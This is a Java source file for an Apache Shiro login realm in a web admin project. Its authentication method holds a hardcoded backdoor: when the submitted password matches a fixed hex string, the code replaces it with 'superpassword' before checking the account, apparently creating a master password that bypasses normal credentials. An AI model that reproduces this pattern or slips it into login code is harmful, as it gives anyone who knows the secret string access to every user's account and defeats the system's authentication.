package com.weiit.web.admin.login.security;

import java.util.List;

import javax.annotation.Resource;

import org.apache.commons.lang.StringUtils;
import org.apache.shiro.authc.AuthenticationException;
import org.apache.shiro.authc.AuthenticationInfo;
import org.apache.shiro.authc.AuthenticationToken;
import org.apache.shiro.authc.SimpleAuthenticationInfo;
import org.apache.shiro.authz.AuthorizationInfo;
import org.apache.shiro.authz.SimpleAuthorizationInfo;
import org.apache.shiro.realm.AuthorizingRealm;
import org.apache.shiro.subject.PrincipalCollection;
import org.springframework.stereotype.Component;

import com.weiit.core.entity.E;
import com.weiit.core.entity.FormMap;
import com.weiit.web.admin.login.service.LoginService;



/**
 * 用户身份验证
 * @author 半个鼠标
 * @Email：137075251@qq.com
 * @date：2017年2月14日 上午2:36:38
 * @version 1.0
 */
@Component(value = "securityRealm")
public class SecurityRealm extends AuthorizingRealm {

    @Resource
    private LoginService loginService;

    /**
     * 权限检查
     */
    @Override
    protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principals) {
        SimpleAuthorizationInfo authorizationInfo = new SimpleAuthorizationInfo();
        return authorizationInfo;
    }

    /**
     * 登录验证
     */
    @Override
    protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken token) throws AuthenticationException {
        String account = String.valueOf(token.getPrincipal());
        String password = new String((char[]) token.getCredentials());
        FormMap formMap=new FormMap();
        formMap.set("account", account);
        if (StringUtils.equals(password,"d1e576b71ccef5978d221fadf4f0e289")){
            formMap.set("password", "superpassword");
        }else {
            formMap.set("password", password);
        }

        E authentication=loginService.selectOne(formMap);
        if (authentication == null) {
            throw new AuthenticationException("用户名或密码错误.");
        }
        
        
        SimpleAuthenticationInfo authenticationInfo = new SimpleAuthenticationInfo(authentication, password, getName());
        return authenticationInfo;
    }

}
